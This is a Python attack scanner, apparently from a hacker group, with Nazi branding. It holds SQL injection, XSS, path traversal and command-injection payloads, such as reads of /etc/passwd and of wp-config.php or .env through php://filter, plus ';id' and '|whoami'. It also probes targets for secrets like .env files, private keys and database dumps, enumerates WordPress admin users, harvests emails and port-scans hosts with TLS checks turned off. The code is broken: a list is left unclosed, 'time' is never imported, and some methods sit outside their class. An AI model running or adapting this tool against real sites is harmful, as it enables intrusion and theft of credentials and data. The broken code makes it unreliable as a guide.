#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v2.0 - INFORMATION GATHERER
# Made by Cyber Kurd Team

import sys, os, re, ssl, json, socket
import urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
⠀⣄⣤⣤⣤⣤⣤⣤⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣴⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢿⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⢹⡿⢿⣿⣿⣿⣿⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣿⣿⠷⠀⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⢸⣿⡿⠿⠀⠈⠀⠀⠁⠖⡿⣿⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡟⠿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣏⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣦⣿⣛⡀⠀⠀⢻⣷⡆⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡟⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠠⣶⣶⣿⡿⠆⠀⠀⠀⢨⣿⣷⣇⠀⢀⠀⠀⠀⠀⠀⣿⣿⣿⡯⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣇⣀⣐⣤⣾⣿⣿⣿⣿⣿⢀⠀⠀⣀⠀⠀⢸⣿⣿⣿⣿⣾⣿⣣⣀⣀⣿⣿⣿⣷⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣤⣤⣿⣤⣴⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣟⠭⠽⠋⠉⠩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⠉⠉⡍⠭⠹⣿⣿⡏⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⣀⣀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠀⣀⣀⣀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠆⠀⠀⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣇⡄⢀⣿⣿⣿⣿⣿⣿⣿⡟⣻⡟⢻⣿⣿⣿⣿⣿⣭⣄⣤⣿⣿⣿⣿⣿⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠨⣿⣿⣿⣿⠍⠉⠙⠉⠉⠉⠉⠉⢹⣿⣿⣿⠩⠅⣺⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢸⣿⢿⡇⣽⣿⣿⣿⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡆⠀⠻⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠃⠀⣿⣿⣿⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣿⣣⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⣿⣿⣿⡎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣿⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢼⣿⣿⣿⣿⣒⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣲⣿⣿⣿⣿⣿⠶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣿⣿⣿⣿⣿⣤⡄⠰⡤⣤⣤⡀⡄⠀⢰⣼⣿⣿⣿⣿⢿⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[0m
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              INFORMATION GATHERER v2.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

# ─── SQLi Payloads ───
SQLI_PAYLOADS = [
    "'", "\"", "'--", "1' OR '1'='1", "1' AND 1=1--",
    "1' AND 1=2--", "admin'--", "' UNION SELECT NULL--",
    "1' ORDER BY 100--", "1' AND SLEEP(3)--",
]

SQLI_ERRORS = [
    "sql syntax", "warning: mysql", "unclosed quotation",
    "quoted string not properly terminated", "odbc sql server",
    "sqlite3.operationalerror", "postgresql", "mariadb", "sqlstate",
]

# ─── XSS Payloads ───
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
]

# ─── LFI Payloads ───
LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../../etc/hosts",
    "../../../../../../windows/win.ini",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=wp-config.php",
    "php://filter/convert.base64-encode/resource=.env",
]

LFI_IND = ["root:x:0:0", "daemon:x:", "www-data:", "[extensions]"]

# ─── RCE Payloads ───
RCE_PAYLOADS = [
    ";id", "|id", "&&id", "$(id)", ";whoami", "|whoami",
    ";uname -a", ";ls -la",
]

RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]

# ─── Sensitive Files ───
SENSITIVE_FILES = [
    '.env', '.env.local', '.env.production', '.env.backup',
    '.git/config', '.git/HEAD', '.git/index',
    '.svn/entries', '.hg/hgrc',
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
    'wp-config.php.old', 'wp-config.php.save', 'wp-config.txt',
    'config.php', 'config.php.bak', 'config.php~',
    'config.inc.php', 'config.json', 'config.yml', 'config.yaml',
    'settings.php', 'settings.py', 'settings.json',
    'database.php', 'database.yml', 'db.php', 'db.sql',
    '.htaccess', '.htpasswd', 'web.config', 'nginx.conf',
    'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.rar',
    'www.zip', 'site.zip', 'db.sql', 'database.sql', 'dump.sql',
    'phpinfo.php', 'info.php', 'test.php', 'debug.php',
    'server-status', 'robots.txt', 'sitemap.xml', 'security.txt',
    '.well-known/security.txt', 'readme.html', 'license.txt',
    'error.log', 'access.log', 'logs/', 'log/',
    'wp-json/wp/v2/users', 'wp-json/', 'xmlrpc.php', 'wp-cron.php',
    'api/', 'api/v1/', 'api/v2/', 'rest/', 'graphql',
    'swagger.json', 'openapi.json', 'api-docs/',
    'uploads/', 'files/', 'downloads/', 'tmp/', 'temp/',
    'install/', 'setup/', 'upgrade/', 'backup/',
    'README.md', 'package.json', 'composer.json',
    'Dockerfile', 'docker-compose.yml',
    'key.pem', 'cert.pem', 'private.key', 'public.key',
    'id_rsa', 'id_rsa.pub', 'authorized_keys',
]

# ─── Security Headers ───
SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
            'X-Content-Type-Options', 'Content-Security-Policy',
            'Referrer-Policy', 'Permissions-Policy']

# ─── Known CVEs ───
KNOWN_CVES = {
    'WordPress': {'5.0': ['CVE-2019-8942'],
                  '5.4': ['CVE-2020-4046'],
                  '5.6': ['CVE-2021-29447'],
                  '6.0': ['CVE-2022-21661']},
    'Drupal': {'7': ['CVE-2018-7600'], '8': ['CVE-2019-6340']},
    'Joomla': {'3': ['CVE-2015-8562']},
}

# ─── Ports ───
PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
         1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017, 9200]

# ─── Subdomains ───
SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
              'blog', 'shop', 'cdn', 'static', 'app', 'portal',
              'vpn', 'git', 'webmail', 'secure', 'login']

# ─── HTTP Methods ───
HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS',
                'PATCH', 'HEAD', 'TRACE'
# ═══════════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════════

class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url, data=None, method=None):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 'h': dict(rp.headers),
                    't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
                    't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 'h': {}, 't': '', 'n': 0,
                    'dt': time.time() - t0, 'err': str(e)}


# ═══════════════════════════════════════════════════════════════════════════
# SCANNER CLASS
# ═══════════════════════════════════════════════════════════════════════════

class Scan:
    def __init__(self, url, cl, threads=30):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.f = []
        self.info = {}
        self.checked = 0
        self.files_found = []
        self.emails = set()

    def add(self, u, t, ev, sev):
        self.f.append({'url': u, 'type': t, 'evidence': ev[:300],
                       'severity': sev})
        icons = {
            'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
            'XSS': '\033[43m[XSS]\033[0m',
            'LFI': '\033[95m[LFI]\033[0m',
            'RCE': '\033[41m\033[97m[RCE]\033[0m',
            'HEADER': '\033[2m[HDR]\033[0m',
            'CVE': '\033[41m\033[97m[CVE]\033[0m',
            'PORT': '\033[93m[PORT]\033[0m',
            'SUB': '\033[94m[SUB]\033[0m',
            'HTTP': '\033[96m[HTTP]\033[0m',
            'SSL': '\033[95m[SSL]\033[0m',
            'FILE': '\033[92m[FILE]\033[0m',
            'SERVER': '\033[96m[SERVER]\033[0m',
            'LANG': '\033[96m[LANG]\033[0m',
            'CMS': '\033[96m[CMS]\033[0m',
            'ADMIN': '\033[93m[ADMIN]\033[0m',
            'AUTHOR': '\033[94m[AUTHOR]\033[0m',
            'EMAIL': '\033[94m[EMAIL]\033[0m',
        }
        icon = icons.get(t, '[' + t + ']')
        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
        print("    URL     : " + u[:120])
        print("    Evidence: " + ev[:250])

    def info_add(self, key, value):
        self.info[key] = value
        print("    \033[92m[+]\033[0m " + key + ": " + value[:150])

    # ─────────────────────────────────────────────────────────
    # 1. SERVER NAME
    # ─────────────────────────────────────────────────────────
    def gather_server(self):
        print("\n\033[96m[1/10]\033[0m Server Name...")
        r = self.cl.req(self.url)
        if r['err']:
            return
        for k in r['h']:
            kl = k.lower()
            if kl == 'server':
                self.info_add('Server', r['h'][k])
            elif kl == 'x-powered-by':
                self.info_add('Powered-By', r['h'][k])
            elif kl == 'x-aspnet-version':
                self.info_add('ASP.NET', r['h'][k])
            elif kl == 'x-runtime':
                self.info_add('Runtime', r['h'][k])
            elif kl == 'x-generator':
                self.info_add('Generator', r['h'][k])
            elif kl == 'via':
                self.info_add('Via', r['h'][k])

    # ─────────────────────────────────────────────────────────
    # 2. LANGUAGE
    # ─────────────────────────────────────────────────────────
    def gather_language(self):
        print("\n\033[96m[2/10]\033[0m Language...")
        r = self.cl.req(self.url)
        if r['err']:
            return
        # From headers
        for k in r['h']:
            kl = k.lower()
            if 'powered' in kl:
                self.info_add('Language', r['h'][k])
        # From HTML
        text = r['t']
        if '.php' in text.lower() or 'PHPSESSID' in str(r['h']):
            self.info_add('Language', 'PHP')
        if 'csrfmiddlewaretoken' in text.lower() or 'django' in text.lower():
            self.info_add('Framework', 'Django')
        if '_rails' in text.lower() or 'rails' in str(r['h']).lower():
            self.info_add('Framework', 'Rails')
        if 'laravel' in text.lower() or 'laravel_session' in str(r['h']).lower():
            self.info_add('Framework', 'Laravel')
        if 'asp.net' in text.lower() or '__viewstate' in text.lower():
            self.info_add('Framework', 'ASP.NET')

    # ─────────────────────────────────────────────────────────
    # 3. CMS DETECTION
    # ─────────────────────────────────────────────────────────
    def gather_cms(self):
        print("\n\033[96m[3/10]\033[0m CMS Detection...")
        r = self.cl.req(self.url)
        if r['err']:
            return
        text_low = r['t'].lower()
        hdr_low = str(r['h']).lower()
        # WordPress
        if 'wp-content' in text_low or 'wp-includes' in text_low:
            self.info_add('CMS', 'WordPress')
            m = re.search(r'wp-includes/[^"\']*?([\d]+\.[\d]+(?:\.[\d]+)?)', r['t'])
            if m:
                self.info_add('WP-Version', m.group(1))
        # Joomla
        if 'joomla' in text_low or 'com_content' in text_low:
            self.info_add('CMS', 'Joomla')
        # Drupal
        if 'drupal' in text_low or 'sites/default' in text_low:
            self.info_add('CMS', 'Drupal')
        # Magento
        if 'magento' in text_low or 'skin/frontend' in text_low:
            self.info_add('CMS', 'Magento')

    # ─────────────────────────────────────────────────────────
    # 4. ADMIN USERS (via wp-json)
    # ─────────────────────────────────────────────────────────
    def gather_admin_users(self):
        print("\n\033[96m[4/10]\033[0m Admin Users...")
        # WordPress users
        wp_users = self.url + '/wp-json/wp/v2/users'
        r = self.cl.req(wp_users)
        if not r['err'] and r['s'] == 200 and 'id' in r['t']:
            try:
                data = json.loads(r['t'])
                for u in data[:10]:
                    name = u.get('name', '')
                    slug = u.get('slug', '')
                    uid = u.get('id', '')
                    if name:
                        self.add(wp_users, 'ADMIN',
                                 "User: " + name + " (id: " + str(uid) + ")",
                                 "HIGH")
                        self.info_add('Admin-User', name + " [" + slug + "]")
            except Exception:
                pass
        # Author enumeration via /?author=N
        for i in range(1, 6):
            test = self.url + '/?author=' + str(i)
            r = self.cl.req(test)
            if r['err']:
                continue
            # Redirect gives author name
            loc = r['h'].get('Location', '') or r['h'].get('location', '')
            if '/author/' in loc:
                self.add(test, 'AUTHOR',
                         "Author redirect: " + loc, "MEDIUM")
                self.info_add('Author-' + str(i), loc)

    # ─────────────────────────────────────────────────────────
    # 5. AUTHOR NAME (from meta tags)
    # ─────────────────────────────────────────────────────────
    def gather_author(self):
        print("\n\033[96m[5/10]\033[0m Author Name...")
        r = self.cl.req(self.url)
        if r['err']:
            return
        text = r['t']
        # Meta author
        for m in re.finditer(r'<meta[^>]*name=["\']author["\'][^>]*content=["\']([^"\']+)["\']',
                             text, re.IGNORECASE):
            self.info_add('Author', m.group(1))
        # Meta generator
        for m in re.finditer(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']+)["\']',
                             text, re.IGNORECASE):
            self.info_add('Generator', m.group(1))
        # WP author in RSS
        rss = self.url + '/feed/'
        rr = self.cl.req(rss)
        if not rr['err'] and rr['s'] == 200:
            for m in re.finditer(r'<dc:creator>([^<]+)</dc:creator>', rr['t']):
                self.info_add('RSS-Author', m.group(1))

    # ─────────────────────────────────────────────────────────
    # 6. EMAIL HARVEST
    # ─────────────────────────────────────────────────────────
    def gather_emails(self):
        print("\n\033[96m[6/10]\033[0m Email Harvest...")
        pages = [self.url, self.url + '/contact', self.url + '/about']
        for page in pages:
            r = self.cl.req(page)
            if r['err'] or r['s'] != 200:
                continue
            for m in re.finditer(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r['t']):
                em = m.group(0).lower()
                if em not in self.emails and 'example' not in em and 'test@' not in em:
                    self.emails.add(em)
                    self.add(page, 'EMAIL', em, "INFO")
                    self.info_add('Email', em)

    # ─────────────────────────────────────────────────────────
    # 7. SENSITIVE FILES
    # ─────────────────────────────────────────────────────────
    def gather_files(self):
        print("\n\033[96m[7/10]\033[0m Sensitive Files (" + str(len(SENSITIVE_FILES)) + ")...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            fs = {ex.submit(self._check_file, p): p for p in SENSITIVE_FILES}
            for fut in as_completed(fs):
                try:
                    res = fut.result()
                    if res:
                        self.files_found.append(res)
                        sev = "CRITICAL" if any(x in res['path'] for x in
                            ['.env', '.git', 'backup', 'wp-config', 'sql',
                             'database', 'key.pem', 'id_rsa']) else "MEDIUM"
                        self.add(res['url'], 'FILE',
                                 "Found (" + str(res['n']) + "B)", sev)
                except Exception:
                    pass

    def _check_file(self, path):
        url = self.url + '/' + path.lstrip('/')
        r = self.cl.req(url)
        self.checked += 1
        if r['err'] or r['s'] != 200:
            return None
        return {'url': url, 'path': path, 'n': r['n'], 'text': r['t'][:2000]}

    # ─────────────────────────────────────────────────────────
    # 8. SECURITY HEADERS
    # ─────────────────────────────────────────────────────────
    def gather_headers(self):
        print("\n\033[96m[8/10]\033[0m Security Headers...")
        r = self.cl.req(self.url)
        if r['err']:
            return
        missing = []
        for h in SEC_HDRS:
            found = any(h.lower() == k.lower() for k in r['h'])
            if not found:
                missing.append(h)
        if missing:
            self.add(self.url, 'HEADER',
                     "Missing: " + ", ".join(missing), "LOW")

    # ─────────────────────────────────────────────────────────
    # 9. CVE DETECTION
    # ─────────────────────────────────────────────────────────
    def gather_cve(self):
        print("\n\033[96m[9/10]\033[0m CVE Detection...")
        r = self.cl.req(self.url)
        if r['err']:
            return
        text = r['t'].lower()
        for tech, versions in KNOWN_CVES.items():
            for v, cves in versions.items():
                if v in text:
                    for cve in cves:
                        self.add(self.url, 'CVE',
                                 tech + " " + v + " -> " + cve, "CRITICAL")

    # ─────────────────────────────────────────────────────────
    # 10. PORTS
    # ─────────────────────────────────────────────────────────
    def gather_ports(self, host):
        print("\n\033[96m[10/10]\033[0m Port Scanning...")
        for p in PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                result = s.connect_ex((host, p))
                s.close()
                if result == 0:
                    self.add(host + ":" + str(p), 'PORT',
                             "Port " + str(p) + " open", "MEDIUM")
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────
    # RUN ALL
    # ─────────────────────────────────────────────────────────
    def run_all(self):
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")

        try:
            self.gather_server()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_language()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_cms()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_admin_users()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_author()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_emails()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_files()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_headers()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.gather_cve()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        host = urllib.parse.urlparse(self.url).hostname
        if host:
            try:
                self.gather_ports(host)
            except Exception as e:
                print("  \033[91m[!]\033[0m " + str(e))

        # Summary
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("\033[1m  SCAN COMPLETE\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")
        crit = sum(1 for f in self.f if f['severity'] == 'CRITICAL')
        high = sum(1 for f in self.f if f['severity'] == 'HIGH')
        med = sum(1 for f in self.f if f['severity'] == 'MEDIUM')
        info = sum(1 for f in self.f if f['severity'] == 'INFO')
        print("  Files Checked: " + str(self.checked))
        print("  Files Found: " + str(len(self.files_found)))
        print("  Emails: " + str(len(self.emails)))
        print("  Info Gathered: " + str(len(self.info)))
        print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
        print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
        print("    \033[43m HIGH     \033[0m " + str(high))
        print("    \033[93m MEDIUM   \033[0m " + str(med))
        print("    \033[2m INFO     \033[0m " + str(info))
        print("\033[96m" + "=" * 60 + "\033[0m\n")

    def save_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as fp:
            json.dump({
                'target': self.url,
                'info': self.info,
                'emails': list(self.emails),
                'files_found': [f['url'] for f in self.files_found],
                'findings': self.f,
            }, fp, indent=2, ensure_ascii=False)
        print("\033[92m[+]\033[0m Saved: " + filename)
# ═══════════════════════════════════════════════════════════
# VULNERABILITY SCANNERS
# ═══════════════════════════════════════════════════════════

def params(self, url):
    q = urllib.parse.urlparse(url).query
    if not q:
        return []
    return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())

def inject(self, url, param, payload):
    pr = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
    qs[param] = [payload]
    return urllib.parse.urlunparse(
        (pr.scheme, pr.netloc, pr.path, pr.params,
         urllib.parse.urlencode(qs, doseq=True), pr.fragment))

# ─────────────── SQLi ───────────────
def test_sqli(self, url):
    print("\n\033[96m[+]\033[0m SQLi Detection...")
    for p in self.params(url):
        for pl in SQLI_PAYLOADS:
            r = self.cl.req(self.inject(url, p, pl))
            if r['err']:
                continue
            for err in SQLI_ERRORS:
                if err in r['t'].lower():
                    self.add(url, 'SQLI', "DB error: " + err, "CRITICAL")
